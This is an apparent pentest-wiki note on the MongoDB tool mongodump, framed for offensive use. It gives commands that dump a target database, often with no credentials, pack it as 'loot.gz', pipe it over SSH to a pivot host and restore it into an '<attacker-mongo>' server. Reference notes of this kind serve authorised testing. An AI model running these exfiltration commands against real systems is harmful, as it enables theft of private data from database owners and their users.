# mongodump

**Tags:** #MongoDB #database #nosql #exfiltration #dump

Part of the **MongoDB Database Tools** package. Dumps an entire MongoDB database (or a single collection) to BSON on disk — the clean, complete way to exfiltrate a whole instance, versus iterating collections with `find()` in [[Tools/Database/mongosh|mongosh]]. Against an unauthenticated instance it needs no credentials; `mongorestore` reverses it.

**Source:** https://www.mongodb.com/docs/database-tools/mongodump/
**Install:** `apt install mongodb-database-tools`

```bash
# Dump everything from an open instance to ./dump/
mongodump --uri="mongodb://<target>:27017" -o ./dump/
# Authenticated
mongodump --uri="mongodb://<user>:<pass>@<target>:27017/?authSource=admin" -o ./dump/
# One database / collection
mongodump --host <target> --db <db> --collection <coll> -o ./dump/

# Efficient exfil: single compressed archive file instead of a dir tree
# (streamable — pipe it straight back over a pivot)
mongodump --uri="mongodb://<target>:27017" --archive=loot.gz --gzip
mongodump --uri="mongodb://<target>:27017" --archive | ssh pivot 'cat > loot.archive'
```

**Reading the loot** — dumps land as `.bson`; convert to readable JSON with `bsondump` (same package):

```bash
bsondump ./dump/<db>/users.bson            # BSON → JSON on stdout
bsondump --pretty ./dump/<db>/users.bson
# Restore an --archive/--gzip dump elsewhere:
mongorestore --archive=loot.gz --gzip --uri="mongodb://<attacker-mongo>:27017"
```

> [!note] **See also**
> Services this tool is used against in this vault: [[Services/Database Services/MongoDB|MongoDB]] — bulk data exfiltration.
> Related tooling: [[Tools/Database/mongosh|mongosh]] (interactive queries), [[Tools/Database/NoSQLMap|NoSQLMap]] (injection/automation).

---

*Created: 2026-09-22*
*Updated: 2026-09-29*
*Model: claude-opus-4-8*
